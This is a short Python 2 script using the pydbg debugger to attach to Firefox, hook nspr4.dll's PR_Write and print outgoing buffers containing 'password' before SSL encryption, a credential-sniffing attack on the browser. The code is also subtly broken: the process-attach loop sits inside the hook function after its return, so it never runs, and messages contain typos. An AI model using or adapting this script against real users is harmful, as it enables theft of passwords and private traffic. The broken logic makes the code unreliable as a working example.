from pydbg import *
from pydbg.defines import *

import utils
import sys

dbg            = pydbg()
found_firefox  = False

# lets set a global pattern that we can make the hook
# search for

pattern = "password"

def ssl_sniff( dbg, args):

	# now we read out

	buffer = ""
	offset = 0

	while 1:
		byte = dbg.read_process_memory( args[1] + offset, 1)

		if byte != "\x00":
			buffer += byte
			offset += 1
			continue
		else:
			break

	if pattern in buffer:

		print "Pre-Encryted: %s" % buffer
	return DBG_CONTINUE

	for (pid, name) in dbg.enumerate_processes():

		if name.lower() == "firefox.exe":

			found_firefox = True
			hooks         = utils.hook_container()

			dbg.attach(pid)
			print "[$] attaching to firefox.ese with PID: %d" % pid

			#resolve the function address
			hook_address = dbg.func_resolve_debuggee("nspr4.dll","PR_Write")

			if hook_address:
				hooks.add( dbg, hook_address, 2, ssl_sniff, None)
				print "[*] nspr4.PR_Write hooked at: 0x%08x" % hook_address

				break
			else:
				print "[$] Error couldnt resolve hook address."
				sys.exit(-1)

if found_firefox:
	print "[*] Hooks set, continuing process."
	dbg.run()
else:
	print "[*] Error: Couldn't find the firefox.exe process."
	sys.exit(-1)